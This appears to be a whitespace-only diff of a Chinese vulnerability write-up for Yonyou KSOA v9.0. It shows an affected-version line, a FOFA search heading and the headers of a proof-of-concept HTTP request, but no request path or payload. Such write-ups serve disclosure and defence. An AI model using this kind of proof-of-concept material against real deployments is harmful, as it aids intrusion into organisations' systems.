@@ -14,7 +14,7 @@ source: "MrWQ/vulnerability-paper"
 
 **影响版本**
 
- 用友时空企业信息融通平台 KSOA v9.0  
+ 用友时空企业信息融通平台 KSOA v9.0  
 
 **FOFA 语句**
 
@@ -34,7 +34,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Referer: ****
-Connection: close
+Connection: close
 Upgrade-Insecure-Requests: 1
 Content-Length: 8
 123123
